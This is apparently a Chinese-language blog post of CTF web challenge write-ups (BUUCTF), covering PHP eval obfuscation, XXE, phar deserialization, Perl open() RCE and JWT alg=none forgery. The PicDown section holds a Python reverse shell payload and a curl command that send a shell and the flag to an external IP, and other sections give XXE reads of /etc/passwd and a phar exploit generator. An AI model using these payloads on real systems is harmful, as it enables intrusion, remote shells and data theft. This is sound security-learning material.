<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; hex2bin <span class="comment"># 在网上任意进制转换自己尝试一下</span></span><br><span class="line"><span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>) =&gt; <span class="number">0x5f474554</span> <span class="comment"># 十进制-十六进制</span></span><br><span class="line">所以：<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>)) ==&gt; <span class="title function_ invoke__">hex2bin</span>(<span class="number">5</span>f474554)</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="number">5</span>f474554) =&gt; <span class="title function_ invoke__">_GET</span></span><br><span class="line">    </span><br><span class="line">(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;) =&gt; <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;abs&#125;)</span><br><span class="line">pi=system&amp;abs=tac flag.php</span><br></pre></td></tr></table></figure></div>

<h4 id="思路二：-HTTP头传参"><a href="#思路二：-HTTP头传参" class="headerlink" title="思路二：[ HTTP头传参 ]"></a>思路二：[ HTTP头传参 ]</h4><p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></p>
<p>利用exec(getallheaders)(){1}</p>
<p>-&gt; getallheaders函数获取当前请求头的所有信息</p>
<h4 id="思路三：-直接读取flag"><a href="#思路三：-直接读取flag" class="headerlink" title="思路三：[ 直接读取flag ]"></a>思路三：[ 直接读取flag ]</h4><p>&#x2F;&#x2F;exec(‘hex2bin(dechex(109270211257898))’) &#x3D;&gt; exec(‘cat f*’)</p>
<h4 id="思路四：-通过fuzz脚本生成payload"><a href="#思路四：-通过fuzz脚本生成payload" class="headerlink" title="思路四：[ 通过fuzz脚本生成payload ]"></a>思路四：[ 通过fuzz脚本生成payload ]</h4><p>不会</p>
<hr>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://www.cnblogs.com/20175211lyz/p/11588219.html#%E6%80%9D%E8%B7%AF%E4%B8%80">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="NCTF2019-True-XML-cookbook-XML-Ajax"><a href="#NCTF2019-True-XML-cookbook-XML-Ajax" class="headerlink" title="[NCTF2019]True XML cookbook [ XML &amp; Ajax]"></a>[NCTF2019]True XML cookbook [ XML &amp; Ajax]</h2><p>知识点：</p>
<p><a class="link" href="https://www.freecodecamp.org/chinese/news/ajax-tutorial/">Ajax <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="网鼎杯-2020-白虎组-PicDown-路由-linux路径-py反弹shell-curl"><a href="#网鼎杯-2020-白虎组-PicDown-路由-linux路径-py反弹shell-curl" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown[ 路由 linux路径 py反弹shell curl]"></a>[网鼎杯 2020 白虎组]PicDown[ 路由 linux路径 py反弹shell curl]</h2><p>Linux一些敏感路径 [ <code>proc</code>查看系统进程信息 ]</p>
<ul>
<li>&#x2F;proc&#x2F;pid&#x2F;cmdline 包含了用于开始进程的命令</li>
<li>&#x2F;proc&#x2F;self&#x2F;environ 包含了可用进程环境变量的列表</li>
<li>&#x2F;proc&#x2F;pid&#x2F;cwd 包含了当前进程工作目录的一个链接 </li>
<li>&#x2F;proc&#x2F;pid&#x2F;exe 包含了正在进程中运行的程序链接</li>
<li>&#x2F;proc&#x2F;pid&#x2F;fd&#x2F; 这个目录包含了进程打开的每一个文件的链接</li>
<li>&#x2F;proc&#x2F;pid&#x2F;mem 包含了进程在内存中的内容</li>
<li>&#x2F;proc&#x2F;pid&#x2F;stat 包含了进程的状态信息</li>
<li>&#x2F;proc&#x2F;pid&#x2F;statm 包含了进程的内存使用信息</li>
</ul>
<hr>
<p>刚开始打开环境，我随便尝试输入，发现参数名是url，很显然的输入了 <code>http://www.baidu.com</code>返回一个下载链接，下载之后用html打开的确是百度。我第一时间想到的是ssrf，使用了file协议去读取服务器下的文件，却无回显。。之后就没思路了</p>
<p>-&gt; 用到了python中的flask路由和urlopen等知识</p>
<h4 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h4><p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-17-00.png"></p>
<p><code>/?url=app.py</code> 下载源码</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span> <span class="comment"># 指向secret.txt文件</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE) <span class="comment"># 打开secret.txt文件</span></span><br><span class="line">SECRET_KEY = f.read().strip() <span class="comment"># secret_key是读取了secret.txt文件的内容</span></span><br><span class="line">os.remove(SECRET_FILE) <span class="comment"># 这里是删除了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:	<span class="comment"># 需要满足的条件 key变量可控 主要看secret_key</span></span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)	<span class="comment"># 漏洞点</span></span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>直观来看SECRET_FILE已经被删除</p>
</blockquote>
<p><strong>在 linux 系统中如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容</strong>。</p>
<p>-&gt; 知识点- 只打开了一个文件，却没有fclose() </p>
<p>-&gt; &#x2F;proc&#x2F;pid&#x2F;fd&#x2F; 这个目录包含了进程打开的每一个文件的链接</p>
<p>-&gt; 慢慢尝试 &#x2F;proc&#x2F;self&#x2F;fd&#x2F;[num] 当num&#x3D;3的时候得到了secret_key &#x3D;&gt;也可以通过bp中的爆破</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-17-01.png"></p>
<p><strong>Python反弹shell Payload：</strong></p>
<p><code>/no_one_know_the_manager?key=IKnSZZCxvarb/BgTnwZ5NDZ1GjnBUJHnSDNa8c3rRX4=&amp;shell=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;39.103.98.109&quot;,10086));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-17-02.png"></p>
<p><strong>外带数据payload：</strong></p>
<p><code>/no_one_know_the_manager?key=IKnSZZCxvarb/BgTnwZ5NDZ1GjnBUJHnSDNa8c3rRX4=&amp;shell=curl%2039.103.98.109:10086/</code>cat%20&#x2F;flag|base64&#96;&#96;</p>
<h4 id="非预期解："><a href="#非预期解：" class="headerlink" title="非预期解："></a>非预期解：</h4><p>直接访问根目录下flag &#x3D;&gt; <code>/flag</code> 下载打开得到flag</p>
<hr>
<p>参考：</p>
<p><a class="link" href="https://blog.csdn.net/sorryagain/article/details/126522401">wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="NCTF2019-True-XML-cookbook-XXE-内网探测"><a href="#NCTF2019-True-XML-cookbook-XXE-内网探测" class="headerlink" title="[NCTF2019]True XML cookbook [ XXE 内网探测]"></a>[NCTF2019]True XML cookbook [ XXE 内网探测]</h2><p>根据题目和环境初始页面（登录页面），直接随便登录抓包</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-18-00.png"></p>
<p>确定xml数据格式 &#x3D;&gt; xxe漏洞</p>
<p>-&gt; 进行测试</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>发现回显是警告性内容，不知道为什么</p>
<p>那就尝试读取敏感信息看看有没有回显</p>
<p>-&gt; file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd &#x3D;&gt; 有回显, 说明的确存在这个漏洞</p>
<p>我自己判断到这里了，后面不知道该干嘛了。（我当时光想读取flag了，看wp才知道，技巧性地，直接读取当前页面的源代码</p>
<p>有助于自己后面的判断）</p>
<p>&#x3D;&gt;<code> &lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt; ]&gt;</code> </p>
<p>-&gt; wc 这里要注意当前页面的地址，网站根目录（&#x2F;var&#x2F;www&#x2F;html） L要大写[ Linux区分大小写 ]</p>
<p>-&gt; 内网探测 - 读取IP地址</p>
<p>-&gt; file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts 10.244.80.162<br>-&gt; file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp 10.128.253.12     169.254.1.1<br>-&gt; file:&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie 10.244.80.162</p>
<p>我也不知道这么多IP地址应该怎么缩小范围，一个一个爆破最后一段(1,255)</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-18-01.png"></p>
<hr>
<h4 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">XXE学习 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/Article-kelp/p/16026652.html">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><blockquote>
<p>open_basedir() 可以访问设置目录下的所有下级目录</p>
</blockquote>
<p>打开环境，注册用户并登录进入</p>
<p>1.上传文件 [ 白名单过滤 ]    下载功能[ 任意文件下载 ]</p>
<blockquote>
<p>..&#x2F;..&#x2F;download.php</p>
<p>..&#x2F;..&#x2F;index.php</p>
<p>..&#x2F;..&#x2F;delete.php</p>
<p>..&#x2F;..&#x2F;class.php </p>
</blockquote>
<p>class.php中存在类 有 file_get_contents函数：文件包含（漏洞点，如何调用）</p>
<p>-&gt; User类中的 __destruct()函数可以调用close()函数；</p>
<p>&#x3D;&gt; 直接调用的话是可行的，但是没有回显。</p>
<p>-&gt; 在FileList类中的 __destruct()函数中是输出结果的 [ 利用这个来输出 ]</p>
<p>-&gt; $this-&gt;FileList()-&gt;close(); &#x3D;&#x3D;&gt; call魔法函数 </p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>(); <span class="comment"># 中间点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123; <span class="comment"># 执行点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Payload：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span> -&gt; filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$a</span> -&gt; db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>-&gt; 在download.php中有了目录的限制，只能通过delete.php来执行payload</p>
<p>-&gt; delete.php中有<code>$file-&gt;detele();</code>调用了File类中delete函数<code>unlink($this-&gt;filename);</code> 通过phar:&#x2F;&#x2F;触发反序列化</p>
<p>通过代码生成phar.phar文件，然后修改为phar.jpg文件上传，之后点删除按钮抓包，将filename改为phar:&#x2F;&#x2F;phar.jpg发包即可</p>
<hr>
<p>参考：</p>
<p><a class="link" href="https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="HITCON-2017-SSRFme-perl语言漏洞"><a href="#HITCON-2017-SSRFme-perl语言漏洞" class="headerlink" title="[HITCON 2017]SSRFme[ perl语言漏洞 ]"></a>[HITCON 2017]SSRFme[ perl语言漏洞 ]</h2><h4 id="函数List："><a href="#函数List：" class="headerlink" title="函数List："></a>函数List：</h4><ul>
<li>escapeshellarg() - 把字符串转码为可以在shell命令里使用的参数（确保安全） - 给字符串增加一个单引号或者转码存在的单引号</li>
<li>chdir() - change directory - 更改当前的工作目录</li>
<li>pathinfo() - 以数组的形式返回关于文件路径的信息 如果不是请求所有信息，那么以字符串的形式返回</li>
<li>shell_exec() - 通过shell环境执行命令，并且将完整的输出以字符串的方式返回</li>
<li>REMOTE_ADDR - 客户端IP</li>
</ul>
<p>GET函数在底层调用了perl语言的open函数，而该函数存在RCE漏洞。<strong>当open函数要打开的文件名中存在管道符（并且系统中存在这个文件名）就会中断原有打开文件操作，并且把这个文件名作为一个命令来执行</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-22-02.png"></p>
<p>看例子吧，创建一个 <code>ls|</code>的文件名 通过GET命令时，会将文件名作为命令执行 （前提是有管道符）</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; <span class="comment"># 输出的就是自己的IP地址</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);<span class="comment"># 创建路径 sandbox/md5(orange + ip) =&gt;网上md5加密一下即可知道</span></span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);<span class="comment"># 切换到对应的目录下</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>])); <span class="comment"># GET命令执行漏洞</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>); <span class="comment"># 创建文件</span></span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); <span class="comment"># 向filename文件中写入内容</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>

<p>payload1: ?url&#x3D;file:ls &#x2F;|&amp;filename&#x3D;ls &#x2F;| 查看根目录下文件 [ 执行两次 ] 第一次是创建文件，第二次是执行命令</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-22-00.png"></p>
<p>payload2: ?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag| 读取根目录下的readflag文件内容[ 也是执行两次 ] 第一次创建文件，第二次是执行命令</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-22-01.png"></p>
<p><a class="link" href="https://mayi077.gitee.io/2020/03/25/HITCON-2017-SSRFme/">参考Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.nnbs.cc/d/6423">参考Wp 伪协议思路 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="b01lers2020-Welcome-to-Earth-JS代码"><a href="#b01lers2020-Welcome-to-Earth-JS代码" class="headerlink" title="[b01lers2020]Welcome to Earth[ JS代码 ]"></a>[b01lers2020]Welcome to Earth[ JS代码 ]</h2><p>各种查看源代码有下一个的链接</p>
<p>&#x2F;chase -&gt; &#x2F;leftt -&gt; &#x2F;shoot -&gt; &#x2F;door </p>
<p>&#x3D;&gt; 跳转到door.js代码</p>
<p>-&gt; &#x2F;open</p>
<p>&#x3D;&gt; 跳转到&#x2F;static&#x2F;js&#x2F;open_sesame.js代码</p>
<p>-&gt; &#x2F;fight</p>
<p>&#x3D;&gt; 跳转到 &#x2F;static&#x2F;js&#x2F;fight.js 代码 [ 终点页面 ]</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scramble</span>(<span class="params">flag, key</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.<span class="title function_">charCodeAt</span>(i) % flag.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;action&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>拼接flag列表中的字符，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line"></span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> item:</span><br><span class="line">    k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(a))</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&#x27;^pctf\&#123;hey_boys[a-zA-Z_]+ck!\&#125;$&#x27;</span>, k):</span><br><span class="line">    <span class="comment"># if re.search(&#x27;^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$&#x27;, k):</span></span><br><span class="line">        <span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure></div>

<p>我刚开始做这个题的时候，以为是审计js代码，对于每个页面的js代码都看了看，有时候第一时间没注意到链接</p>
<hr>
<h2 id="HFCTF2020-EasyLogin-伪造jwt-admin进入"><a href="#HFCTF2020-EasyLogin-伪造jwt-admin进入" class="headerlink" title="[HFCTF2020]EasyLogin [ 伪造jwt - admin进入 ]"></a>[HFCTF2020]EasyLogin [ 伪造jwt - admin进入 ]</h2><p>1 - 无法注册admin用户</p>
<p>2 - 抓包可以发现这里用到了jwt来验证身份 - <a class="link" href="https://jwt.io/">生成jwt的网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>3 - 在login页面的源码中发现有，api.js泄露 - 使用了koa框架</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-24-01.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-24-00.png"></p>
<p>得到基本的目录结构：直接访问<code>url/controllers/api.js</code>（不知道为什么不是app.js）</p>
<p><img lazyload src="/images/loading.svg" data-src="/BUU-Web%E5%88%B7%E9%A2%98/4-24-02.png"></p>
<p>这里写出了得到flag的条件是以admin身份进入</p>
<p><strong>Result：</strong>构造jwt来伪造admin身份</p>
<p>第一次我直接用软件想爆破出秘钥，爆不出来。</p>
<p><strong>看Wp  -</strong>  将签名算法更改为none。当alg为none时，后端将不执行签名验证 - 伪造admin身份</p>
